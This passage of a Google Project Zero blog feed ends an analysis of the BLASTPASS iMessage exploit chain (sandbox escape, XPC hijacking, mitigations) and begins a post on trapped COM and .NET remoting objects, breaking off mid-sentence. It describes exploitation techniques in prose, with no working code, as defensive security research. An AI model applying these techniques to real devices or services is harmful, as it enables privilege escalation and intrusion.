 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;(global-name&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;&amp;quot;com.apple.mobilegestalt.xpc&amp;quot;))))&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;(This profile snippet was generated using the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://github.com/cellebrite-labs/sandblaster&quot;&gt;Cellebrite labs&amp;#39; fork of SandBlaster&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;In FORCEDENTRY the sandbox escape was contained directly in the NSExpression payload (though that was an escape from the less-restrictive IMTranscoderAgent sandbox). This time around it seems extra care has been taken to prevent analysis of the sandbox escape.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;The question is: where does the key come from? We had a few theories:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_t2u4j4vhkrnm-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c34 c43 li-bullet-0&quot;&gt;&lt;span&gt;Perhaps the key is just obfuscated, and by completely reversing the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;NSExpression&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;payload we can find it?&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c43 c34 li-bullet-0&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Perhaps the key is derived from some target-specific information?&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c43 c34 li-bullet-0&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Perhaps the key was somehow delivered in some other way and can be read from inside BlastDoor?&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;We spent a day analysing the NSExpression payload and concluded that the third theory appeared to be the correct one. The NSExpression walks up the native stack looking for the communication ports back to &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;imagent&lt;/span&gt;&lt;span&gt;. It then hijacks that communication, effectively taking over responsibility for parsing all subsequent incoming requests from &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;imagent&lt;/span&gt;&lt;span&gt;&amp;nbsp;for &amp;quot;defusing&amp;quot; of iMessage payloads. The NSExpression loops 100 times, parsing incoming requests as XPC messages, reading the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;request&lt;/span&gt;&lt;span&gt;&amp;nbsp;xpc dictionary then the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;data&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;xpc data&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;object to get access to the raw, binary iMessage format. It waits until the device receives another iMessage with a specific format, and from that message extracts an AES key which is then used to decrypt the next NSExpression stage and evaluate it.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;We were unable to recover any messages with the matching format and therefore unable to analyse the next stage of the exploit.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;XQFzMDWmii-c12&quot; id=&quot;h.kwbzpb78bv4k&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c18&quot;&gt;Conclusion&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;In contrast to FORCEDENTRY, BLASTPASS&amp;#39;s separation of the ASLR disclosure and RCE phases mitigated the need for a novel weird machine. Whilst the heap groom was impressively complicated and precise, the exploit still relied on well-known exploitation techniques. Furthermore, the MakerNote bplist groom and callback-JOP PAC defeat techniques appear to have been in use for multiple years, based on similarities with &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://citizenlab.ca/2023/04/nso-groups-pegasus-spyware-returns-in-2022/&quot;&gt;Citizenlab&amp;#39;s blogpost in 2023&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;, which looked at devices compromised in 2022. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Enforcing much stricter requirements on the format of the bplist inside the MakerNote (for example: a size limit or a strict-parser mode which rejects duplicate keys) would seem prudent. The callback-JOP issue is likely harder to mitigate.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;The HomeKit aspect of the exploit chain remains mostly a mystery, but it seems very likely that it was somehow involved in the ASLR disclosure. &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2021/01/a-look-at-imessage-in-ios-14.html&quot;&gt;Samuel Gro&amp;szlig;&amp;#39;s post &amp;quot;A Look at iMessage in iOS 14&amp;quot;&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;in 2021,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;mentioned that Apple added support for re-randomizing the shared cache slide of certain services. Ensuring that BlastDoor has a unique ASLR slide could be a way to mitigate this.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;This is the second in-the-wild NSO exploit which relied on simply renaming a file extension to access a parser in an unexpected context which shouldn&amp;#39;t have been allowed. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;FORCEDENTRY had a .gif which was really a .pdf. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;BLASTPASS had a .png which was really a .webp. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;A basic principle of sandboxing is treating all incoming attacker-controlled data as untrusted, and not simply trusting a file extension.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;This speaks to a broader challenge in sandboxing: that current approaches based on process isolation can only take you so far. They increase the length of an exploit chain, but don&amp;#39;t necessarily reduce the size of the initial remote attack surface. Accurately mapping, then truly reducing the scope of that initial remote attack surface should be a top priority.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c7 XQFzMDWmii-c45&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;

</content><link rel='replies' type='application/atom+xml' href='https://googleprojectzero.blogspot.com/feeds/4442255878341841259/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='https://googleprojectzero.blogspot.com/2025/03/blasting-past-webp.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='https://www.blogger.com/feeds/4838136820032157985/posts/default/4442255878341841259'/><link rel='self' type='application/atom+xml' href='https://www.blogger.com/feeds/4838136820032157985/posts/default/4442255878341841259'/><link rel='alternate' type='text/html' href='https://googleprojectzero.blogspot.com/2025/03/blasting-past-webp.html' title='Blasting Past Webp'/><author><name>Google Project Zero</name><uri>http://www.blogger.com/profile/08975904405228580347</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhpVzqhKSxPZc0TxpxC_Ka4_MVC3fJD4u9HbPMnh5jE4_tLYK08va_RroD4K3PkzOHV5SLJa8ovjXtUpF5FJRaA2SBW-SFv4fELlDeF8kEznmeBu4Zzi-kV_AMIlQLXBZTgUj9s6WQvkpE041lbp2XmSqGkj4u49X9EQOdNCeum_m1acT1HAul-xsuToi0/s72-c/image8.png" height="72" width="72"/><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-4838136820032157985.post-8871156912918818192</id><published>2025-01-30T09:57:00.001-08:00</published><updated>2025-01-30T09:57:50.269-08:00</updated><title type='text'>Windows Bug Class: Accessing Trapped COM Objects with IDispatch</title><content type='html'>&lt;style type=&quot;text/css&quot;&gt;@import url(https://themes.googleusercontent.com/fonts/css?kit=XGMkxXUZTA64h2imyzu79g);ol.lst-kix_to636nf8kaap-4.start{counter-reset:lst-ctn-kix_to636nf8kaap-4 0}ol.lst-kix_s9l3chg8etv0-3.start{counter-reset:lst-ctn-kix_s9l3chg8etv0-3 0}.lst-kix_to636nf8kaap-3&gt;li{counter-increment:lst-ctn-kix_to636nf8kaap-3}.lst-kix_to636nf8kaap-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_to636nf8kaap-7,lower-latin) &quot;. &quot;}.lst-kix_to636nf8kaap-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_to636nf8kaap-6,decimal) &quot;. &quot;}.lst-kix_to636nf8kaap-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_to636nf8kaap-3,decimal) &quot;. &quot;}.lst-kix_to636nf8kaap-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_to636nf8kaap-5,lower-roman) &quot;. &quot;}ol.lst-kix_s9l3chg8etv0-6.start{counter-reset:lst-ctn-kix_s9l3chg8etv0-6 0}.lst-kix_to636nf8kaap-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_to636nf8kaap-4,lower-latin) &quot;. &quot;}.lst-kix_to636nf8kaap-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_to636nf8kaap-1,lower-latin) &quot;. &quot;}ol.lst-kix_to636nf8kaap-0.start{counter-reset:lst-ctn-kix_to636nf8kaap-0 0}.lst-kix_s9l3chg8etv0-3&gt;li{counter-increment:lst-ctn-kix_s9l3chg8etv0-3}ol.lst-kix_s9l3chg8etv0-7.start{counter-reset:lst-ctn-kix_s9l3chg8etv0-7 0}.lst-kix_to636nf8kaap-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_to636nf8kaap-2,lower-roman) &quot;. &quot;}ol.lst-kix_to636nf8kaap-7.start{counter-reset:lst-ctn-kix_to636nf8kaap-7 0}.lst-kix_to636nf8kaap-8&gt;li{counter-increment:lst-ctn-kix_to636nf8kaap-8}.lst-kix_to636nf8kaap-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_to636nf8kaap-0,decimal) &quot;. &quot;}.lst-kix_s9l3chg8etv0-8&gt;li{counter-increment:lst-ctn-kix_s9l3chg8etv0-8}ol.lst-kix_s9l3chg8etv0-2.start{counter-reset:lst-ctn-kix_s9l3chg8etv0-2 0}.lst-kix_s9l3chg8etv0-2&gt;li{counter-increment:lst-ctn-kix_s9l3chg8etv0-2}.lst-kix_s9l3chg8etv0-5&gt;li{counter-increment:lst-ctn-kix_s9l3chg8etv0-5}ol.lst-kix_to636nf8kaap-8.start{counter-reset:lst-ctn-kix_to636nf8kaap-8 0}ol.lst-kix_to636nf8kaap-1.start{counter-reset:lst-ctn-kix_to636nf8kaap-1 0}ol.lst-kix_s9l3chg8etv0-5.start{counter-reset:lst-ctn-kix_s9l3chg8etv0-5 0}ol.lst-kix_s9l3chg8etv0-8.start{counter-reset:lst-ctn-kix_s9l3chg8etv0-8 0}.lst-kix_to636nf8kaap-0&gt;li{counter-increment:lst-ctn-kix_to636nf8kaap-0}ol.lst-kix_s9l3chg8etv0-5{list-style-type:none}ol.lst-kix_s9l3chg8etv0-6{list-style-type:none}.lst-kix_s9l3chg8etv0-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s9l3chg8etv0-7,lower-latin) &quot;. &quot;}.lst-kix_s9l3chg8etv0-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s9l3chg8etv0-8,lower-roman) &quot;. &quot;}ol.lst-kix_s9l3chg8etv0-3{list-style-type:none}ol.lst-kix_s9l3chg8etv0-4{list-style-type:none}ol.lst-kix_s9l3chg8etv0-7{list-style-type:none}ol.lst-kix_s9l3chg8etv0-8{list-style-type:none}.lst-kix_to636nf8kaap-6&gt;li{counter-increment:lst-ctn-kix_to636nf8kaap-6}.lst-kix_s9l3chg8etv0-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s9l3chg8etv0-3,decimal) &quot;. &quot;}.lst-kix_s9l3chg8etv0-7&gt;li{counter-increment:lst-ctn-kix_s9l3chg8etv0-7}ol.lst-kix_s9l3chg8etv0-1.start{counter-reset:lst-ctn-kix_s9l3chg8etv0-1 0}ol.lst-kix_s9l3chg8etv0-1{list-style-type:none}.lst-kix_s9l3chg8etv0-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s9l3chg8etv0-1,lower-latin) &quot;. &quot;}.lst-kix_s9l3chg8etv0-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s9l3chg8etv0-2,lower-roman) &quot;. &quot;}ol.lst-kix_s9l3chg8etv0-2{list-style-type:none}ol.lst-kix_s9l3chg8etv0-0{list-style-type:none}.lst-kix_s9l3chg8etv0-0&gt;li{counter-increment:lst-ctn-kix_s9l3chg8etv0-0}.lst-kix_s9l3chg8etv0-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s9l3chg8etv0-0,decimal) &quot;. &quot;}.lst-kix_to636nf8kaap-1&gt;li{counter-increment:lst-ctn-kix_to636nf8kaap-1}ol.lst-kix_s9l3chg8etv0-4.start{counter-reset:lst-ctn-kix_s9l3chg8etv0-4 0}ol.lst-kix_to636nf8kaap-5.start{counter-reset:lst-ctn-kix_to636nf8kaap-5 0}ol.lst-kix_to636nf8kaap-2.start{counter-reset:lst-ctn-kix_to636nf8kaap-2 0}.lst-kix_to636nf8kaap-5&gt;li{counter-increment:lst-ctn-kix_to636nf8kaap-5}.lst-kix_s9l3chg8etv0-6&gt;li{counter-increment:lst-ctn-kix_s9l3chg8etv0-6}ol.lst-kix_to636nf8kaap-8{list-style-type:none}ol.lst-kix_to636nf8kaap-3.start{counter-reset:lst-ctn-kix_to636nf8kaap-3 0}.lst-kix_to636nf8kaap-2&gt;li{counter-increment:lst-ctn-kix_to636nf8kaap-2}ol.lst-kix_to636nf8kaap-3{list-style-type:none}ol.lst-kix_to636nf8kaap-2{list-style-type:none}ol.lst-kix_to636nf8kaap-1{list-style-type:none}ol.lst-kix_to636nf8kaap-0{list-style-type:none}.lst-kix_to636nf8kaap-7&gt;li{counter-increment:lst-ctn-kix_to636nf8kaap-7}ol.lst-kix_to636nf8kaap-7{list-style-type:none}ol.lst-kix_to636nf8kaap-6{list-style-type:none}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}ol.lst-kix_to636nf8kaap-5{list-style-type:none}ol.lst-kix_to636nf8kaap-4{list-style-type:none}.lst-kix_to636nf8kaap-4&gt;li{counter-increment:lst-ctn-kix_to636nf8kaap-4}ol.lst-kix_s9l3chg8etv0-0.start{counter-reset:lst-ctn-kix_s9l3chg8etv0-0 0}.lst-kix_s9l3chg8etv0-4&gt;li{counter-increment:lst-ctn-kix_s9l3chg8etv0-4}.lst-kix_s9l3chg8etv0-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s9l3chg8etv0-4,lower-latin) &quot;. &quot;}ol.lst-kix_to636nf8kaap-6.start{counter-reset:lst-ctn-kix_to636nf8kaap-6 0}.lst-kix_s9l3chg8etv0-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s9l3chg8etv0-5,lower-roman) &quot;. &quot;}.lst-kix_s9l3chg8etv0-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s9l3chg8etv0-6,decimal) &quot;. &quot;}.lst-kix_s9l3chg8etv0-1&gt;li{counter-increment:lst-ctn-kix_s9l3chg8etv0-1}.lst-kix_to636nf8kaap-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_to636nf8kaap-8,lower-roman) &quot;. &quot;}ol{margin:0;padding:0}table td,table th{padding:0}.ROKGfcMygP-c6{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:&quot;Arial&quot;;font-style:normal}.ROKGfcMygP-c11{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.ROKGfcMygP-c2{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.ROKGfcMygP-c7{color:#000000;text-decoration:none;vertical-align:baseline;font-style:normal}.ROKGfcMygP-c3{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.ROKGfcMygP-c17{color:#434343;font-weight:400;font-size:11pt;font-family:&quot;Arial&quot;}.ROKGfcMygP-c9{text-decoration:none;vertical-align:baseline;font-style:normal}.ROKGfcMygP-c15{font-weight:400;font-size:16pt;font-family:&quot;Arial&quot;}.ROKGfcMygP-c0{font-size:9pt;font-weight:400;font-family:&quot;Roboto Mono&quot;}.ROKGfcMygP-c16{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.ROKGfcMygP-c4{color:#188038;font-weight:400;font-family:&quot;Roboto Mono&quot;}.ROKGfcMygP-c14{margin-left:36pt;padding-left:0pt}.ROKGfcMygP-c12{color:#1967d2}.ROKGfcMygP-c13{font-style:italic}.ROKGfcMygP-c5{color:#188038}.ROKGfcMygP-c8{height:11pt}.ROKGfcMygP-c1{color:#37474f}.ROKGfcMygP-c10{color:#c5221f}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:&quot;Arial&quot;}p{margin:0;color:#000000;font-size:11pt;font-family:&quot;Arial&quot;}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=&quot;c16 doc-content&quot;&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c17&quot;&gt;Posted by James Forshaw, Google Project Zero&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;Object orientated remoting technologies such as DCOM and .NET Remoting make it very easy to develop an object-orientated interface to a service which can cross process and security boundaries. This is because they&amp;#39;re designed to support a wide range of objects, not just those implemented in the service, but any other object compatible with being remoted. For example, if you wanted to expose an XML document across the client-server boundary, you could use a pre-existing COM or .NET library and return that object back to the client. By default when the object is returned it&amp;#39;s marshaled by reference, which results in the object staying in the out-of-process server.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;This flexibility has a number of downsides, one of which is the topic of this blog, the trapped object bug class. Not all objects which can be remoted are necessarily safe to do so. For example, the previously mentioned XML libraries, in both COM and .NET, support executing arbitrary script code in the context of an XSLT document. If an XML document object is made accessible over the boundary, then the client could execute code in the context of the server process, which can result in privilege escalation or remote-code execution.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;There are a number of scenarios that can introduce this bug class. The most common is where an unsafe object is shared inadvertently. An example of this was &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42450766&quot;&gt;CVE-2019-0555&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. This bug was introduced because when developing the Windows Runtime libraries an XML document object was needed. The developers decided to add some code to the existing XML DOM Document v6 COM object which exposed the runtime specific interfaces. As these runtime interfaces didn&amp;#39;t support the XSLT scripting feature, the assumption was this was safe to expose across privilege boundaries. Unfortunately a malicious client could query for the old &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;IXMLDOMDocument&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;interface which was still accessible and use it to run an XSLT script and escape a sandbox.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;Another scenario is where there exists an asynchronous marshaling primitive. This is where an object can be marshaled both by value and by reference and the platform chooses by reference as the default mechanism, For example the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/dotnet/api/system.io.fileinfo?view%3Dnetframework-4.8.1&quot;&gt;FileInfo&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/dotnet/api/system.io.directoryinfo?view%3Dnetframework-4.8.1&quot;&gt;DirectoryInfo&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;.NET classes are both serializable, so can be sent to a .NET remoting service marshaled by value. But they also derive from the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/dotnet/api/system.marshalbyrefobject?view%3Dnetframework-4.8.1&quot;&gt;MarshalByRefObject&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;class, which means they can be marshaled by reference. An attacker can leverage this by sending to the server a serialized form of the object which when deserialized will create a new instance of the object in the server&amp;#39;s process. If the attacker can read back the created object, the runtime will marshal it back to the attacker by reference, leaving the object trapped in the server process. Finally the attacker can call methods on the object, such as creating new files which will execute with the privileges of the server. This attack is implemented in my &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://github.com/tyranid/ExploitRemotingService&quot;&gt;ExploitRemotingService&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;tool.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;The final scenario I&amp;#39;ll mention as it has the most relevancy to this blog post is abusing the built in mechanisms the remoting technology uses to lookup and instantiate objects to create an unexpected object. For example, in COM if you can find a code path to call the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance&quot;&gt;CoCreateInstance&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API with an arbitrary CLSID and get that object passed back to the client then you can use it to run arbitrary code in the context of the server. An example of this form is &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42450084&quot;&gt;CVE-2017-0211&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, which was a bug which exposed a &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/stg/structured-storage-start-page&quot;&gt;Structured Storage&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;object across a security boundary. The storage object supports the &lt;/span&gt;&lt;span 